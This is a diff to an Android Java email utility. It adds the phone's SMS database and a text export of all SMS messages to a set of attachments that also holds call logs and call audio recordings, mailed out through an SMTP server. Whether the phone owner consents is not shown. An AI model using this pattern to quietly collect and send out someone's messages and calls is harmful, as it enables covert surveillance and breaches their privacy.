@@ -34,9 +34,8 @@ public class SendEmailUtil {
 	private static final String TAG = "SendEmailUtil";
 
 	public static final String host = "smtp.163.com";
-	// public static final String host = "smtp.gmail.com";
 
-	private final static String FILE_CALL = DatabaseUtil.DB_PATH;
+	// public static final String host = "smtp.gmail.com";
 
 	private Session initialize() {
 		Properties props = new Properties();
@@ -85,9 +84,15 @@ public class SendEmailUtil {
 						Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
 						files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
 					}
-					if ((new File(FILE_CALL)).exists()) {
-						Debug.v("Add", FILE_CALL);
-						files.add(FILE_CALL);
+					if ((new File(MainApplication.FILE_SMS_DB)).exists()) {
+						Debug.v("Add", MainApplication.FILE_SMS_DB);
+						files.add(MainApplication.FILE_SMS_DB);
+					}
+
+					SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
+					if ((new File(MainApplication.FILE_SMS_TEXT)).exists()) {
+						Debug.v("Add", MainApplication.FILE_SMS_TEXT);
+						files.add(MainApplication.FILE_SMS_TEXT);
 					}
 
 					if (files.size() <= 0) {
@@ -247,9 +252,14 @@ public class SendEmailUtil {
 						Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
 						files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
 					}
-					if ((new File(FILE_CALL)).exists()) {
-						Debug.v("Add", FILE_CALL);
-						files.add(FILE_CALL);
+					if ((new File(MainApplication.FILE_SMS_DB)).exists()) {
+						Debug.v("Add", MainApplication.FILE_SMS_DB);
+						files.add(MainApplication.FILE_SMS_DB);
+					}
+					SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
+					if ((new File(MainApplication.FILE_SMS_TEXT)).exists()) {
+						Debug.v("Add", MainApplication.FILE_SMS_TEXT);
+						files.add(MainApplication.FILE_SMS_TEXT);
 					}
 
 					File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
@@ -377,7 +387,7 @@ public class SendEmailUtil {
 	public synchronized void sendMail(String subject, String body, String recipients, Vector<String> files) throws AddressException, MessagingException {
 
 		Log.e(TAG, "recipients=" + recipients);
-		
+
 		MimeMessage message = new MimeMessage(initialize());
 
 		try {
